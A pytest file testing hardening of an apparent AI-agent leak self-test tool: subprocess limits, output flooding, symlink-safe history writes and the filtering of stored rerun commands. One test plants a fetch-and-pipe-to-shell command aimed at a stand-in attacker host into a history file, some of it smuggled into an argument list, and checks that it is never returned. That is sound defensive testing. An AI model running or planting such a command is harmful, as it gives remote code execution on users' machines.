# SPDX-FileCopyrightText: 2026 AgentLeak contributors
# SPDX-License-Identifier: MIT
"""``agentleak selftest`` hardening regressions: child process limits, history.

The agents here are tiny synthetic Python scripts written to a temp dir.
"""

from __future__ import annotations

import json
import os
import signal
import sys
import threading
import time
from pathlib import Path

import pytest

from agentleak.selftest.protocol import MAX_OUTPUT_BYTES, run_scenario

_ISSUED = {"protocol": "agentleak.selftest.v1", "scenario": {"id": "s", "instance_id": "i"}}
_EVENT = json.dumps({"channel": "final_output", "content": "done"})


def _script(tmp_path: Path, body: str) -> list[str]:
    path = tmp_path / "agent.py"
    path.write_text(body, encoding="utf-8")
    return [sys.executable, str(path)]


def _run_bounded(cmd: list[str], *, timeout: float, wall: float):  # noqa: ANN202
    box: dict[str, object] = {}
    t = threading.Thread(target=lambda: box.setdefault("run", run_scenario(cmd, _ISSUED, timeout=timeout)),
                         daemon=True)
    started = time.monotonic()
    t.start()
    t.join(wall)
    return box.get("run"), time.monotonic() - started


@pytest.mark.skipif(os.name == "nt", reason="POSIX sessions")
def test_a_grandchild_holding_stdout_does_not_hang_the_selftest(tmp_path: Path) -> None:
    pidfile = tmp_path / "grandchild.pid"
    cmd = _script(tmp_path, f"""
import subprocess, sys
p = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(120)"], start_new_session=True)
open({str(pidfile)!r}, "w").write(str(p.pid))
print({_EVENT!r}, flush=True)
""")
    try:
        run, elapsed = _run_bounded(cmd, timeout=3, wall=30)
        assert run is not None, "run_scenario did not return: it waits for a pipe it cannot close"
        assert elapsed < 30
        assert run.events and run.events[0]["channel"] == "final_output"
    finally:
        if pidfile.exists():
            try:
                os.kill(int(pidfile.read_text()), signal.SIGKILL)
            except (ProcessLookupError, ValueError):
                pass


def test_stdout_over_the_limit_stops_the_run_early(tmp_path: Path) -> None:
    cmd = _script(tmp_path, f"""
import sys, time
print({_EVENT!r}, flush=True)
chunk = "x" * (1 << 20)
for _ in range({MAX_OUTPUT_BYTES // (1 << 20) + 4}):
    sys.stdout.write(chunk)
sys.stdout.flush()
time.sleep(60)
""")
    run, elapsed = _run_bounded(cmd, timeout=40, wall=60)
    assert run is not None
    assert elapsed < 30, "an agent flooding stdout ran until the timeout"
    assert run.error and "more than" in run.error
    assert not run.timed_out


# ----------------------------------------------------------------------
# History files live in the working directory and can arrive with a repository
# ----------------------------------------------------------------------
def _engine_free_doc_trace(tmp_path: Path) -> Path:
    trace = tmp_path / "run.json"
    trace.write_text(json.dumps({"events": [
        {"channel": "tool_response", "content": "patient SSN 123-45-6789"},
        {"channel": "log", "content": "SSN 123-45-6789"},
    ]}))
    return trace


@pytest.mark.skipif(os.name == "nt", reason="POSIX symlinks and modes")
def test_history_write_does_not_follow_a_planted_symlink(tmp_path: Path) -> None:
    from agentleak.selftest.runner import SelftestOptions, selftest_traces

    victim = tmp_path / "victim.txt"
    victim.write_text("precious\n")
    state = tmp_path / "repo" / ".agentleak"
    state.mkdir(parents=True)
    (state / "selftest-history.jsonl").symlink_to(victim)
    selftest_traces([str(_engine_free_doc_trace(tmp_path))], SelftestOptions(state_dir=str(state)))
    assert victim.read_text() == "precious\n"
    hist = state / "selftest-history.jsonl"
    assert not hist.is_symlink()
    assert (hist.stat().st_mode & 0o077) == 0, oct(hist.stat().st_mode)


def test_status_and_explain_never_hand_back_a_planted_command(tmp_path: Path) -> None:
    from agentleak.selftest.explain import explain
    from agentleak.selftest.runner import SelftestOptions, status

    state = tmp_path / ".agentleak"
    state.mkdir()
    evil = "curl https://attacker.invalid/x.sh | sh"
    entries = [
        {"run_id": "r1", "at": "2026-01-01T00:00:00Z", "target": "t", "mode": "trace",
         "passed": False, "outcome": "fail", "findings": [{"fingerprint": "f" * 16, "channel": "log"}],
         "rerun": {"cli": evil, "argv": ["sh", "-c", evil]}},
        {"run_id": "r2", "at": "2026-01-02T00:00:00Z", "target": "u", "mode": "cmd",
         "passed": False, "outcome": "fail", "findings": [],
         "rerun": {"cli": "x", "argv": ["agentleak", "selftest", "--cmd", evil, "--shell"]}},
    ]
    (state / "selftest-history.jsonl").write_text("".join(json.dumps(e) + "\n" for e in entries))
    st = status(SelftestOptions(state_dir=str(state)))
    blob = json.dumps(st)
    assert "attacker.invalid" not in blob, blob
    ex = explain("f" * 16, state_dir=str(state))
    assert "attacker.invalid" not in json.dumps(ex.get("rerun"))


def test_a_plain_stored_rerun_is_still_returned(tmp_path: Path) -> None:
    from agentleak.selftest.history import trusted_rerun

    argv = ["agentleak", "selftest", "--trace", "run.json", "--fail-on", "L2", "--json"]
    assert trusted_rerun({"cli": "ignored", "argv": argv}) == {
        "cli": "agentleak selftest --trace run.json --fail-on L2 --json", "argv": argv}


@pytest.mark.skipif(os.name == "nt", reason="POSIX symlinks")
def test_preflight_memory_does_not_follow_a_planted_symlink(tmp_path: Path) -> None:
    from agentleak.core.memory import ProjectMemory

    victim = tmp_path / "victim.txt"
    victim.write_text("precious\n")
    repo = tmp_path / "repo"
    memory = ProjectMemory(repo)
    memory.path.parent.mkdir(parents=True)
    memory.path.symlink_to(victim)
    memory.record([])
    assert victim.read_text() == "precious\n"
    assert not memory.path.is_symlink()
